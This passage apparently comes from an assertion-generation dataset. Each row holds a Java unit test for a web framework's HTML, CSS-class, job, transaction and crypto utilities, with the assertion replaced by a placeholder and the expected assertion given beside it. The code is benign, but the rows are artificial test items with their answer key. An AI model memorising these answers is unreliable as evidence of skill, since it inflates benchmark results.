lic static IHtmlListElement li(CharSequence text) { return new HtmlListElement(text); }"	"assertEquals(""<ul><li>"" + ESCAPED_HTML_TEXT + ""</li><li>2</li></ul>"", html)"
"testMultipleOl() { String html = HTML.ol(HTML.li(HTML_TEXT), HTML.li(""2"")).toHtml(); ""<AssertPlaceHolder>""; }
lic static IHtmlListElement li(CharSequence text) { return new HtmlListElement(text); }"	"assertEquals(""<ol><li>"" + ESCAPED_HTML_TEXT + ""</li><li>2</li></ol>"", html)"
"testHtmlCssStyle() { IHtmlContent head = HTML.head(HTML.cssStyle(SAMPLE_CSS)); ""<AssertPlaceHolder>""; }
cssStyle(CharSequence... cssContent) { return new StyleElementBuilder(cssContent).type(""text/css""); }"	"assertEquals(""<head><style type=""text/css"">"" + SAMPLE_CSS + ""</style></head>"", head.toHtml())"
"testAddCssClassToIcon() { IHtmlContent html = HTML.icon(""font:\uE002"").addCssClass(""my-class""); ""<AssertPlaceHolder>""; }
icon(final CharSequence icon) { final Matcher matcher = FONT_ICON_PATTERN.matcher(icon); if (matcher.find()) { // font icon if (matcher.group(2) == null) { return span(matcher.group(1)).cssClass(""font-icon""); // icon from Scout font } else { return span(matcher.group(2)).cssClass(""font-icon font-"" + matcher.group(1)); // icon from custom font } } else { // image icon return imgByIconId(icon); } }"	"assertEquals(""<span class=""font-icon my-class"">\uE002</span>"", html.toHtml())"
"testFullHtml() { IHtmlDocument html = HTML.html(HTML.cssStyle(SAMPLE_CSS), HTML_TEXT); String expected = ""<html><head><style type=""text/css"">"" + SAMPLE_CSS + ""</style>"" + ""</head><body>"" + ESCAPED_HTML_TEXT + ""</body></html>""; ""<AssertPlaceHolder>""; }
cssStyle(CharSequence... cssContent) { return new StyleElementBuilder(cssContent).type(""text/css""); }"	assertEquals(expected, html.toHtml())
"testFullHtmlDocType() { IHtmlDocument html = HTML.html5(HTML.cssStyle(SAMPLE_CSS), HTML_TEXT); String expected = ""<!DOCTYPE html><html><head><style type=""text/css"">"" + SAMPLE_CSS + ""</style>"" + ""</head><body>"" + ESCAPED_HTML_TEXT + ""</body></html>""; ""<AssertPlaceHolder>""; }
cssStyle(CharSequence... cssContent) { return new StyleElementBuilder(cssContent).type(""text/css""); }"	assertEquals(expected, html.toHtml())
"testManyBinds() { IHtmlElement h2 = HTML.h2(""h2""); IHtmlTable table = createTable(""0"");  IHtmlElement html = HTML.div(h2, table);  String exp = ""<div><h2>h2</h2>"" + createTableString(""0"") + ""</div>""; ""<AssertPlaceHolder>""; }
h2(CharSequence... text) { return new HtmlNodeBuilder(""h2"", text); }"	assertEquals(exp, html.toHtml())
"testInput() { String expected = ""<input id='lastName' name='Last name' class='person-data' maxlength='30' value='' type='text'>""; expected = expected.replace(""'"", """""");  IHtmlInput htmlInput = HTML.input().id(""lastName"").name(""Last name"").cssClass(""person-data"").maxlength(30).value("""").type(""text""); ""<AssertPlaceHolder>""; }
input() { return new HtmlInputBuilder(); }"	assertEquals(expected, htmlInput.toHtml())
"testAddCssClassNull() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, null); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testAddCssClassToNull() { String newClasses = BEANS.get(StyleHelper.class).addCssClass((String) null, ADDED_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(ADDED_CLASS, newClasses)
"testAddCssClassEmpty() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, """"); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testAddCssClassToEmpty() { String newClasses = BEANS.get(StyleHelper.class).addCssClass("""", ADDED_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(ADDED_CLASS, newClasses)
"testAddCssClass() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, ADDED_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	"assertEquals(INITIAL_CLASSES + "" "" + ADDED_CLASS, newClasses)"
"testAddMultipleCssClasses() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(""a b c"", ""e b d""); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	"assertEquals(""a b c e d"", newClasses)"
"testAddCssClassAlreadyContainedAsFirst() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, INITIAL_FIRST_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testAddCssClassAlreadyContainedAsLast() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, INITIAL_LAST_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testAddCssClassAlreadyContained() { String newClasses = BEANS.get(StyleHelper.class).addCssClass(INITIAL_CLASSES, CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testAddCssClassToNullCssClasses() { String nullClasses = null; String newClasses = BEANS.get(StyleHelper.class).addCssClass(nullClasses, ADDED_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(ADDED_CLASS, newClasses)
"testAddCssClassToEmptyCssClasses() { String emptyClasses = """"; String newClasses = BEANS.get(StyleHelper.class).addCssClass(emptyClasses, ADDED_CLASS); ""<AssertPlaceHolder>""; }
addCssClass(String cssClasses, String cssClassesToAdd) { return addCssClasses(cssClasses, cssClassesAsList(cssClassesToAdd)); }"	assertEquals(ADDED_CLASS, newClasses)
"testRemoveCssClassNull() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(INITIAL_CLASSES, null); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testRemoveCssClassToNull() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass((String) null, ADDED_CLASS); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals("""", newClasses)"
"testRemoveCssClassEmpty() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(INITIAL_CLASSES, """"); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	assertEquals(INITIAL_CLASSES, newClasses)
"testRemoveCssClassToEmpty() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass("""", ADDED_CLASS); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals("""", newClasses)"
"testRemoveCssClassFirst() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(INITIAL_CLASSES, INITIAL_FIRST_CLASS); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals(""class "" + INITIAL_LAST_CLASS, newClasses)"
"testRemoveCssClassLast() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(INITIAL_CLASSES, INITIAL_LAST_CLASS); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals(INITIAL_FIRST_CLASS + "" "" + CLASS, newClasses)"
"testRemoveCssClass() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(INITIAL_CLASSES, CLASS); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals(INITIAL_FIRST_CLASS + "" "" + INITIAL_LAST_CLASS, newClasses)"
"testAllCssClasses() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(""a b c"", ""c b a""); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals("""", newClasses)"
"testRemoveMultipleCssClasses() { String newClasses = BEANS.get(StyleHelper.class).removeCssClass(""a b c"", ""e b d""); ""<AssertPlaceHolder>""; }
removeCssClass(String cssClasses, String cssClassToRemove) { return removeCssClasses(cssClasses, cssClassesAsList(cssClassToRemove)); }"	"assertEquals(""a c"", newClasses)"
"testValues() { ""<AssertPlaceHolder>""; }
values() { return m_elementIndex.values(); }"	assertEquals(CollectionUtility.arrayList(m_john1, m_anna, m_maria, m_john2, m_frank, m_tom), m_store.values())
"testInitializeInstanceBase() { PostConstructBase base = new PostConstructBase(); BeanInstanceUtil.initializeBeanInstance(base);  List<String> expectedMethodInvocations = CollectionUtility.arrayList( formatLogEntry(PostConstructBase.class, METHOD_NAME_PUBLIC_POST_CONSTRUCT), formatLogEntry(PostConstructBase.class, METHOD_NAME_PROTECTED_POST_CONSTRUCT), formatLogEntry(PostConstructBase.class, METHOD_NAME_PACKAGE_PRIVATE_POST_CONSTRUCT), formatLogEntry(PostConstructBase.class, METHOD_NAME_PRIVATE_POST_CONSTRUCT)); Collections.sort(expectedMethodInvocations);  ""<AssertPlaceHolder>""; }
initializeBeanInstance(Object instance) { Class<?> clazz = instance.getClass(); initializeBeanInstance(instance, collectInjectedFields(clazz), collectInjectedMethods(clazz), collectPostConstructMethods(clazz)); }"	assertEquals(expectedMethodInvocations, base.getMethodInvocationLog())
"testInitializeInstanceBaseEx1() { PostConstructEx1 baseEx1 = new PostConstructEx1(); BeanInstanceUtil.initializeBeanInstance(baseEx1);  List<String> expectedMethodInvocations = CollectionUtility.arrayList( formatLogEntry(PostConstructBase.class, METHOD_NAME_PRIVATE_POST_CONSTRUCT), formatLogEntry(PostConstructEx1.class, METHOD_NAME_PUBLIC_POST_CONSTRUCT), formatLogEntry(PostConstructEx1.class, METHOD_NAME_PROTECTED_POST_CONSTRUCT), formatLogEntry(PostConstructEx1.class, METHOD_NAME_PACKAGE_PRIVATE_POST_CONSTRUCT), formatLogEntry(PostConstructEx1.class, METHOD_NAME_PRIVATE_POST_CONSTRUCT)); Collections.sort(expectedMethodInvocations);  ""<AssertPlaceHolder>""; }
initializeBeanInstance(Object instance) { Class<?> clazz = instance.getClass(); initializeBeanInstance(instance, collectInjectedFields(clazz), collectInjectedMethods(clazz), collectPostConstructMethods(clazz)); }"	assertEquals(expectedMethodInvocations, baseEx1.getMethodInvocationLog())
"testInitializeInstanceBaseEx2() { PostConstructEx2 baseEx2 = new PostConstructEx2(); BeanInstanceUtil.initializeBeanInstance(baseEx2);  List<String> expectedMethodInvocations = CollectionUtility.arrayList( formatLogEntry(PostConstructBase.class, METHOD_NAME_PRIVATE_POST_CONSTRUCT), formatLogEntry(PostConstructEx2.class, METHOD_NAME_PUBLIC_POST_CONSTRUCT), formatLogEntry(PostConstructEx2.class, METHOD_NAME_PROTECTED_POST_CONSTRUCT), formatLogEntry(PostConstructEx2.class, METHOD_NAME_PACKAGE_PRIVATE_POST_CONSTRUCT), formatLogEntry(PostConstructEx2.class, METHOD_NAME_PRIVATE_POST_CONSTRUCT)); Collections.sort(expectedMethodInvocations);  ""<AssertPlaceHolder>""; }
initializeBeanInstance(Object instance) { Class<?> clazz = instance.getClass(); initializeBeanInstance(instance, collectInjectedFields(clazz), collectInjectedMethods(clazz), collectPostConstructMethods(clazz)); }"	assertEquals(expectedMethodInvocations, baseEx2.getMethodInvocationLog())
"Exception { final CountDownLatch stoppingLatch = new CountDownLatch(1); final CountDownLatch continueStoppingLatch = new CountDownLatch(1);  // crate platform listener that signals stopping state BeanMetaData bean = new BeanMetaData(IPlatformListener.class) .withApplicationScoped(true) .withInitialInstance((IPlatformListener) event -> { if (event.getState() == State.PlatformStopping) { stoppingLatch.countDown(); try { continueStoppingLatch.await(); } catch (InterruptedException e) { // nop } } });  final TestingPlatformImplementor platform = new TestingPlatformImplementor(bean); platform.start();  // expect platform started platform.awaitPlatformStarted();  Future<?> platformStopFuture = s_executor.submit(() -> platform.stop());  stoppingLatch.await();  try { platform.awaitPlatformStarted(); } catch (PlatformException e) { ""<AssertPlaceHolder>""; }  continueStoppingLatch.countDown(); platformStopFuture.get(); }
awaitPlatformStarted() { awaitLatchSafe(m_platformStarted); throwOnPlatformInvalid(); }"	"assertEquals(""The platform is stopping."", e.getMessage())"
"MalformedURLException { URL jarUrl = getClass().getResource(""test repository/test.jar_""); URL scoutXml = new URL(""jar:"" + jarUrl.toExternalForm() + ""!/"" + JandexInventoryBuilder.SCOUT_XML_PATH); JandexInventoryBuilder builder = new JandexInventoryBuilder(RebuildStrategy.ALWAYS); Index index = builder.scanModule(builder.findIndexUri(scoutXml)); ""<AssertPlaceHolder>""; }
findIndexUri(URL scoutXmlUrl) { String s = scoutXmlUrl.toExternalForm(); try { return new URI(s.substring(0, s.length() - SCOUT_XML_PATH.length()) + JANDEX_INDEX_PATH); } catch (URISyntaxException ex) { throw new PlatformException(""Cannot find index URI from '{}'"", s, ex); } }"	assertNotNull(index)
"Throwable { final IBlockingCondition blockingCondition = Jobs.newBlockingCondition(true); final P_ExceptionCapturer exceptionCapturer = new P_ExceptionCapturer();  Jobs.schedule(() -> { try { blockingCondition.waitFor(1, TimeUnit.NANOSECONDS, ""hint-blocking""); fail(""TimedOutError expected""); } catch (TimedOutError e) { ""<AssertPlaceHolder>""; } }, Jobs.newInput() .withExceptionHandling(exceptionCapturer, true)) .awaitDone();  exceptionCapturer.throwOnError(); }
waitFor(final long timeout, final TimeUnit unit, final String... executionHints) { final IFuture<?> currentFuture = IFuture.CURRENT.get(); if (currentFuture instanceof JobFutureTask) { blockJobThread((JobFutureTask<?>) currentFuture, timeout, unit, executionHints); } else { blockRegularThread(timeout, unit); } }"	"assertFalse(""hint not unset"", IFuture.CURRENT.get().containsExecutionHint(""hint-blocking""))"
"Throwable { final IBlockingCondition blockingCondition = Jobs.newBlockingCondition(true); final BlockingCountDownLatch setupLatch = new BlockingCountDownLatch(1); final P_ExceptionCapturer exceptionCapturer = new P_ExceptionCapturer();  IFuture<Void> future = Jobs.schedule(() -> { setupLatch.countDown();  try { blockingCondition.waitFor(10, TimeUnit.SECONDS, ""hint-blocking""); fail(""ThreadInterruptedError expected""); } catch (ThreadInterruptedError e) { ""<AssertPlaceHolder>""; } }, Jobs.newInput() .withExceptionHandling(exceptionCapturer, true));  setupLatch.await(); future.cancel(true); future.awaitFinished(10, TimeUnit.SECONDS);  exceptionCapturer.throwOnError(); }
waitFor(final long timeout, final TimeUnit unit, final String... executionHints) { final IFuture<?> currentFuture = IFuture.CURRENT.get(); if (currentFuture instanceof JobFutureTask) { blockJobThread((JobFutureTask<?>) currentFuture, timeout, unit, executionHints); } else { blockRegularThread(timeout, unit); } }"	"assertFalse(""hint not unset"", IFuture.CURRENT.get().containsExecutionHint(""hint-blocking""))"
"testZeroStartDuration() { ExecutionTrigger trigger = Jobs.newExecutionTrigger() .withStartIn(0, TimeUnit.SECONDS); Jobs.schedule(mock(IRunnable.class), Jobs.newInput() .withExecutionTrigger(trigger)); ""<AssertPlaceHolder>""; }
getStartTime() { return (m_startTime != null ? m_startTime : getNow()); }"	assertEquals(trigger.getNow(), trigger.getStartTime())
"testZeroEndDuration() { ExecutionTrigger trigger = Jobs.newExecutionTrigger() .withEndIn(0, TimeUnit.SECONDS); Jobs.schedule(mock(IRunnable.class), Jobs.newInput() .withExecutionTrigger(trigger)); ""<AssertPlaceHolder>""; }
getEndTime() { return m_endTime; }"	assertEquals(trigger.getNow(), trigger.getEndTime())
"testUnregisterWhenFinished() { IFuture<Void> future = Jobs.schedule(() -> { // NOOP }, Jobs.newInput()); future.awaitFinished(10, TimeUnit.SECONDS);  // Assert no futures left JobManager jobManager = (JobManager) Jobs.getJobManager(); ""<AssertPlaceHolder>""; }
getFutures(final Predicate<IFuture<?>> filter) { return m_futures.values(filter); }"	assertEquals(0, jobManager.getFutures(null).size())
"InterruptedException { final BlockingCountDownLatch latch = new BlockingCountDownLatch(1); IFuture<Void> future = Jobs.schedule(() -> { latch.countDownAndBlock(); }, Jobs.newInput());  latch.await(); future.cancel(false); latch.unblock(); future.awaitFinished(10, TimeUnit.SECONDS);  // Assert no futures left JobManager jobManager = (JobManager) Jobs.getJobManager(); ""<AssertPlaceHolder>""; }
getFutures(final Predicate<IFuture<?>> filter) { return m_futures.values(filter); }"	assertEquals(0, jobManager.getFutures(null).size())
"testUnregisterWhenCancelledBeforeExecution() { IFuture<Void> future = Jobs.schedule(() -> { // NOOP }, Jobs.newInput() .withExecutionTrigger(Jobs.newExecutionTrigger() .withStartIn(1, TimeUnit.HOURS))); future.cancel(false);  // Assert no futures left JobManager jobManager = (JobManager) Jobs.getJobManager(); ""<AssertPlaceHolder>""; }
getFutures(final Predicate<IFuture<?>> filter) { return m_futures.values(filter); }"	assertEquals(0, jobManager.getFutures(null).size())
"testRepetitiveJobsFinishNormally1() { IFuture<Void> future = Jobs.schedule(() -> { // NOOP }, Jobs.newInput() .withExecutionTrigger(Jobs.newExecutionTrigger() .withSchedule(FixedDelayScheduleBuilder.repeatForTotalCount(100, 1, TimeUnit.MILLISECONDS)))); future.awaitFinished(10, TimeUnit.SECONDS);  // Assert no futures left JobManager jobManager = (JobManager) Jobs.getJobManager(); ""<AssertPlaceHolder>""; }
getFutures(final Predicate<IFuture<?>> filter) { return m_futures.values(filter); }"	assertEquals(0, jobManager.getFutures(null).size())
"testRepetitiveJobsCancelled1() { IFuture<Void> future = Jobs.schedule(() -> { IFuture.CURRENT.get().cancel(true); // NOOP }, Jobs.newInput() .withExecutionTrigger(Jobs.newExecutionTrigger() .withSchedule(FixedDelayScheduleBuilder.repeatForTotalCount(100, 1, TimeUnit.MILLISECONDS)))); future.awaitFinished(10, TimeUnit.SECONDS);  // Assert no futures left JobManager jobManager = (JobManager) Jobs.getJobManager(); ""<AssertPlaceHolder>""; }
getFutures(final Predicate<IFuture<?>> filter) { return m_futures.values(filter); }"	assertEquals(0, jobManager.getFutures(null).size())
"InterruptedException { MDC.put(MDC_KEY, ""value should not be pushed to child thread"");  final AtomicReference<String> childThreadMdcValue = new AtomicReference<>(); final CountDownLatch latch = new CountDownLatch(1); new NamedThreadFactory(""mdc-test-thread"").newThread(() -> { childThreadMdcValue.set(MDC.get(MDC_KEY)); latch.countDown(); }).start();  latch.await(1, TimeUnit.SECONDS); ""<AssertPlaceHolder>""; }
newThread(final Runnable runnable) { final AtomicReference<ThreadInfo> threadInfoRef = new AtomicReference<>(); final Thread thread = new Thread(m_group, runnable, m_threadName, 0) {  @Override public void run() { /* * Workaround to clear inherited Mapped Diagnostic Context (MDC) which would otherwise preserve * and log MDC entries which were valid when the new worker thread was created. * Logback < 1.1.5 is affected (see https://jira.qos.ch/browse/LOGBACK-422) */ MDC.clear();  ThreadInfo.CURRENT.set(threadInfoRef.get()); try { super.run(); } finally { ThreadInfo.CURRENT.remove(); } } }; threadInfoRef.set(new ThreadInfo(thread, m_threadName, m_sequence.incrementAndGet()));  thread.setDaemon(false); thread.setPriority(Thread.NORM_PRIORITY); thread.setUncaughtExceptionHandler(this);  return thread; }"	assertNull(childThreadMdcValue.get())
"testTextPostProcessorUniqueness() { ITextPostProcessor postProcessor = new TestingTextPostProcessor(); DynamicNls nls = spy(new DynamicNls() .withTextPostProcessor(postProcessor));  List<ITextPostProcessor> postProcessorList = Arrays.asList(postProcessor, postProcessor); nls.withTextPostProcessor(postProcessor); nls.withTextPostProcessors(postProcessorList);  ""<AssertPlaceHolder>""; }
getTextPostProcessors() { return unmodifiableSet(m_textPostProcessors); }"	assertEquals(1, nls.getTextPostProcessors().size())
"testNullTextPostProcessor() { ITextPostProcessor postProcessor = new TestingTextPostProcessor(); DynamicNls nls = spy(new DynamicNls());  List<ITextPostProcessor> postProcessorList = Arrays.asList(postProcessor, null); nls.withTextPostProcessors(postProcessorList);  ""<AssertPlaceHolder>""; }
getTextPostProcessors() { return unmodifiableSet(m_textPostProcessors); }"	assertEquals(1, nls.getTextPostProcessors().size())
"testSpacesAndHyphens() { List<String> input = Arrays.asList( ""abc_PT"", ""abc-mno1"", ""ABC MNO2"", ""abC NOP"", ""ABCOP"", ""abcopp"", ""ABC PQR"", ""abc PT"", ""ABC-PT"");  List<String> expectedResult = Arrays.asList( ""abc-mno1"", ""ABC MNO2"", ""abC NOP"", ""ABC PQR"", ""abc PT"", ""ABC-PT"", ""abc_PT"", ""ABCOP"", ""abcopp"");  List<String> actualResult = new ArrayList<>(input); Collections.sort(actualResult, m_collatorProvider.getInstance(new Locale(""en"")));  ""<AssertPlaceHolder>""; }
getInstance(Locale locale) { // always return a cloned instance return (Collator) THREAD_LOCAL.get() .computeIfAbsent(locale, this::create) .clone(); }"	assertEquals(expectedResult, actualResult)
"testDogs() { List<String> input = Arrays.asList( ""The dogs bark"", ""The dog barks"", ""The dog sleeps"");  List<String> expectedResult = Arrays.asList( ""The dog barks"", ""The dog sleeps"", ""The dogs bark"");  List<String> actualResult = new ArrayList<>(input); Collections.sort(actualResult, m_collatorProvider.getInstance(new Locale(""en"")));  ""<AssertPlaceHolder>""; }
getInstance(Locale locale) { // always return a cloned instance return (Collator) THREAD_LOCAL.get() .computeIfAbsent(locale, this::create) .clone(); }"	assertEquals(expectedResult, actualResult)
"testAddListener() { final BasicPropertySupport propertySupport = new BasicPropertySupport(null); WeakPropertyChangeListener weakEventListener = mock(WeakPropertyChangeListener.class); propertySupport.addPropertyChangeListener(weakEventListener); ""<AssertPlaceHolder>""; }
hasListeners(String propertyName) { synchronized (m_listenerLock) { List generalListeners = getPropertyChangeListeners(); if (CollectionUtility.hasElements(generalListeners)) { return true; } List specificListeners = null; if (propertyName != null && m_childListeners != null) { specificListeners = getSpecificPropertyChangeListeners().get(propertyName); } return CollectionUtility.hasElements(specificListeners); } }"	assertTrue(propertySupport.hasListeners(null))
"testRemoveListener() { final BasicPropertySupport propertySupport = new BasicPropertySupport(null); WeakPropertyChangeListener weakEventListener = mock(WeakPropertyChangeListener.class); propertySupport.addPropertyChangeListener(weakEventListener); propertySupport.removePropertyChangeListener(weakEventListener); ""<AssertPlaceHolder>""; }
hasListeners(String propertyName) { synchronized (m_listenerLock) { List generalListeners = getPropertyChangeListeners(); if (CollectionUtility.hasElements(generalListeners)) { return true; } List specificListeners = null; if (propertyName != null && m_childListeners != null) { specificListeners = getSpecificPropertyChangeListeners().get(propertyName); } return CollectionUtility.hasElements(specificListeners); } }"	assertFalse(propertySupport.hasListeners(null))
"testEncryptDecrypt() { char[] password = ""insecure"".toCharArray(); int keyLength = 128;  Crypter crypter = BEANS.get(Crypter.class).init(password, keyLength); String clearTextData = ""lorem ipsum dolor""; String encryptedData = crypter.encrypt(clearTextData); String decryptedData = crypter.decrypt(encryptedData); ""<AssertPlaceHolder>""; }
decrypt(String encryptedData) { return decrypt(encryptedData, false); }"	assertEquals(clearTextData, decryptedData)
"testUrlSafeEncryptDecrypt() { char[] password = ""insecure"".toCharArray(); int keyLength = 128;  Crypter crypter = BEANS.get(Crypter.class).init(password, keyLength); String clearTextData = ""lorem ipsum dolor""; String encryptedData = crypter.encryptUrlSafe(clearTextData); String decryptedData = crypter.decryptUrlSafe(encryptedData); ""<AssertPlaceHolder>""; }
decryptUrlSafe(String encryptedData) { return decrypt(encryptedData, true); }"	assertEquals(clearTextData, decryptedData)
"testHashStability() { final byte[] data = ""my text to hash"".getBytes(ENCODING); Assert.""<AssertPlaceHolder>""; }
hash(byte[] data) { Assertions.assertNotNull(data, ""no data provided""); DigestInputStream stream = toHashingStream(new ByteArrayInputStream(data)); try { stream.readAllBytes(); } catch (IOException e) { throw new ProcessingException(""Unable to hash."", e); } return stream.getMessageDigest().digest(); }"	"assertEquals(""JqpRPiojKrf7Pb4rkfTrLjyz5noCYCWLJVVQo3TwV+t83ZG6dR6QNyB5yXbBL1fhkO0Xh0qr05Xor33blAuHrw=="", Base64Utility.encode(SecurityUtility.hash(data)))"
"testMultiStatusOk() { MultiStatus s = new MultiStatus(); s.add(Status.OK_STATUS); s.add(Status.OK_STATUS); ""<AssertPlaceHolder>""; }
add(IStatus status) { m_children.add(Assertions.assertNotNull(status)); }"	assertTrue(s.isOK())
"testMultiStatusNok() { MultiStatus s = new MultiStatus(); s.add(Status.OK_STATUS); s.add(new Status(""error"", IStatus.ERROR)); ""<AssertPlaceHolder>""; }
add(IStatus status) { m_children.add(Assertions.assertNotNull(status)); }"	assertFalse(s.isOK())
"testMessage() { MultiStatus multiStatus = new MultiStatus(); multiStatus.add(new TestStatus()); multiStatus.add(new TestStatus2()); ""<AssertPlaceHolder>""; }
getMessage() { return formatMessages(filterSameOrder(filterSameSeverity(m_children))); }"	assertEquals(TestStatus.class.getSimpleName(), multiStatus.getMessage())
"testCode() { MultiStatus multiStatus = new MultiStatus(); multiStatus.add(new TestStatus()); multiStatus.add(new TestStatus2()); ""<AssertPlaceHolder>""; }
getCode() { if (!m_children.isEmpty()) { return m_children.first().getCode(); } return super.getCode(); }"	"assertEquals(""must return code from first child status"", 6, multiStatus.getCode())"
"testStatusOrder() { ""<AssertPlaceHolder>""; }
getOrder() { return m_order; }"	assertEquals(IOrdered.DEFAULT_ORDER, m_infoStatus.getOrder(), 0.00001)
"Exception { CallableChain<Object> chain = new CallableChain<>(); chain.add(new TransactionProcessor<>() .withCallerTransaction(null) .withTransactionScope(TransactionScope.MANDATORY));  try { chain.call(() -> ""result""); fail(); } catch (TransactionRequiredException e) { ""<AssertPlaceHolder>""; } }
withTransactionScope(final TransactionScope transactionScope) { m_transactionScope = Assertions.assertNotNull(transactionScope, ""transactionScope must not be null""); return this; }"	assertTrue(true)
"Exception { final ITransactionMember txMember = mock(ITransactionMember.class); when(txMember.getMemberId()).thenReturn(""abc""); when(txMember.needsCommit()).thenReturn(true); when(txMember.commitPhase1()).thenReturn(true);  CallableChain<Object> chain = new CallableChain<>(); chain.add(new TransactionProcessor<>() .withCallerTransaction(null) .withTransactionScope(TransactionScope.REQUIRES_NEW) .withTransactionMembers(Arrays.asList(txMember)));  chain.call(() -> { ""<AssertPlaceHolder>""; return null; });  InOrder inOrder = Mockito.inOrder(txMember); inOrder.verify(txMember, times(1)).commitPhase1(); inOrder.verify(txMember, times(1)).commitPhase2(); inOrder.verify(txMember, never()).rollback(); inOrder.verify(txMember, times(1)).release(); }
withTransactionMembers(final List<ITransactionMember> transactionMembers) { m_transactionMembers.addAll(transactionMembers); return this; }"	"assertSame(txMember, ITransaction.CURRENT.get().getMember(""abc""))"
"Exception { final ITransactionMember txMember = mock(ITransactionMember.class); when(txMember.getMemberId()).thenReturn(""abc""); when(txMember.needsCommit()).thenReturn(true); when(txMember.commitPhase1()).thenReturn(true);  CallableChain<Object> chain = new CallableChain<>(); chain.add(new TransactionProcessor<>() .withCallerTransaction(null) .withTransactionScope(TransactionScope.REQUIRES_NEW) .withTransactionMembers(Arrays.asList(txMember)));  try { chain.call(() -> { ""<AssertPlaceHolder>""; throw new RuntimeException(""JUnit exception""); }); fail(""exception expected""); } catch (RuntimeException e) { // NOOP }  InOrder inOrder = Mockito.inOrder(txMember); inOrder.verify(txMember, never()).commitPhase1(); inOrder.verify(txMember, never()).commitPhase2(); inOrder.verify(txMember, times(1)).rollback(); inOrder.verify(txMember, times(1)).release(); }
withTransactionMembers(final List<ITransactionMember> transactionMembers) { m_transactionMembers.addAll(transactionMembers); return this; }"	"assertSame(txMember, ITransaction.CURRENT.get().getMember(""abc""))"
"Exception { final ITransactionMember txMember = mock(ITransactionMember.class); when(txMember.getMemberId()).thenReturn(""abc""); when(txMember.needsCommit()).thenReturn(true); when(txMember.commitPhase1()).thenReturn(true);  CallableChain<Object> chain = new CallableChain<>(); chain.add(new TransactionProcessor<>() .withCallerTransaction(null) .withTransactionScope(TransactionScope.REQUIRED) .withTransactionMembers(Arrays.asList(txMember)));  chain.call(() -> { ""<AssertPlaceHolder>""; return null; });  InOrder inOrder = Mockito.inOrder(txMember); inOrder.verify(txMember, times(1)).commitPhase1(); inOrder.verify(txMember, times(1)).commitPhase2(); inOrder.verify(txMember, never()).rollback(); inOrder.verify(txMember, times(1)).release(); }
withTransactionMembers(final List<ITransactionMember> transactionMembers) { m_transactionMembers.addAll(transactionMembers); return this; }"	"assertSame(txMember, ITransaction.CURRENT.get().getMember(""abc""))"
